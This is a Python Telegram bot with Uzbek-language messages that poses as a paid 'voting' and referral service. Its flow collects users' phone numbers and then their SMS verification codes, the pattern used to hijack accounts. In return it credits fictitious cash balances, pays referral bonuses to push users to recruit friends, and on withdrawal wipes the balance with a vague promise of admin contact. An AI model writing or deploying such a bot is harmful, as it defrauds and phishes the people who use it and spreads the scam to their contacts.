import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils.executor import start_webhook

# ------------------ CONFIG ------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
APP_NAME = os.getenv("FLY_APP_NAME")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN topilmadi. Secrets qo'yish kerak.")
if not APP_NAME:
    raise ValueError("❌ FLY_APP_NAME secrets qo'yish kerak.")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# Webhook sozlamalari
WEBHOOK_HOST = f"https://{APP_NAME}.fly.dev"
WEBHOOK_PATH = f"/webhook/{BOT_TOKEN}"
WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"

WEBAPP_HOST = "0.0.0.0"
WEBAPP_PORT = 8080

# ------------------ DATABASE (oddiy dict) ------------------
users = {}  # {user_id: {"balance": 0, "referrals": []}}

# ------------------ KEYBOARDS ------------------
main_menu = ReplyKeyboardMarkup(resize_keyboard=True)
main_menu.add("📊 Ovoz berish", "💰 Balans")
main_menu.add("👥 Do‘stlarni taklif qilish", "🏦 Pul yechish")

phone_keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
phone_keyboard.add(KeyboardButton("📱 Telefon raqamni yuborish", request_contact=True))

# ------------------ HANDLERS ------------------
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in users:
        users[user_id] = {"balance": 0, "referrals": []}

        # Referralni tekshirish
        args = message.get_args()
        if args.isdigit():
            inviter_id = int(args)
            if inviter_id in users and inviter_id != user_id:
                users[inviter_id]["balance"] += 60000  # referral bonusi
                users[inviter_id]["referrals"].append(user_id)
                await bot.send_message(inviter_id, f"🎉 Yangi do‘st keldi! +60 000 UZS balansga qo‘shildi.")

    await message.answer("👋 Salom! Men ovoz berish va referal botman.", reply_markup=main_menu)


@dp.message_handler(lambda m: m.text == "📊 Ovoz berish")
async def vote_handler(message: types.Message):
    await message.answer("📱 Telefon raqamingizni yuboring:", reply_markup=phone_keyboard)


@dp.message_handler(content_types=['contact'])
async def contact_handler(message: types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number

    await message.answer(f"✅ Raqam qabul qilindi: {phone}")
    await message.answer("⏳ Raqam tekshirilmoqda. Biroz kuting...")

    await asyncio.sleep(3)
    await message.answer("📩 Iltimos SMS kodni yuboring.")


@dp.message_handler(lambda m: m.text.isdigit() and len(m.text) == 4)
async def code_handler(message: types.Message):
    user_id = message.from_user.id
    code = message.text

    # Kod qabul qilindi
    users[user_id]["balance"] += 120000
    await message.answer(f"✅ Kod qabul qilindi! Balansingizga +120 000 UZS qo‘shildi.\n💰 Balans: {users[user_id]['balance']} UZS", reply_markup=main_menu)


@dp.message_handler(lambda m: m.text == "💰 Balans")
async def balance_handler(message: types.Message):
    user_id = message.from_user.id
    balance = users[user_id]["balance"]
    refs = len(users[user_id]["referrals"])
    await message.answer(f"💰 Balansingiz: {balance} UZS\n👥 Taklif qilingan do‘stlar: {refs} ta")


@dp.message_handler(lambda m: m.text == "👥 Do‘stlarni taklif qilish")
async def invite_handler(message: types.Message):
    user_id = message.from_user.id
    link = f"https://t.me/{(await bot.get_me()).username}?start={user_id}"
    await message.answer(f"👥 Do‘stlaringizni taklif qiling!\n🔗 Sizning referral linkingiz:\n{link}")


@dp.message_handler(lambda m: m.text == "🏦 Pul yechish")
async def withdraw_handler(message: types.Message):
    user_id = message.from_user.id
    balance = users[user_id]["balance"]
    if balance >= 300000:
        users[user_id]["balance"] = 0
        await message.answer("✅ Pul yechish so‘rovi yuborildi. Tez orada siz bilan admin bog‘lanadi.")
    else:
        await message.answer(f"❌ Pul yechish uchun kamida 300 000 UZS bo‘lishi kerak.\n💰 Hozirgi balans: {balance} UZS")

# ------------------ STARTUP / SHUTDOWN ------------------
async def on_startup(dp):
    print("Bot ishga tushmoqda...")
    await bot.set_webhook(WEBHOOK_URL)

async def on_shutdown(dp):
    print("Bot to‘xtayapti...")
    await bot.delete_webhook()

# ------------------ MAIN ------------------
if __name__ == "__main__":
    start_webhook(
        dispatcher=dp,
        webhook_path=WEBHOOK_PATH,
        on_startup=on_startup,
        on_shutdown=on_shutdown,
        skip_updates=True,
        host=WEBAPP_HOST,
        port=WEBAPP_PORT,
    )
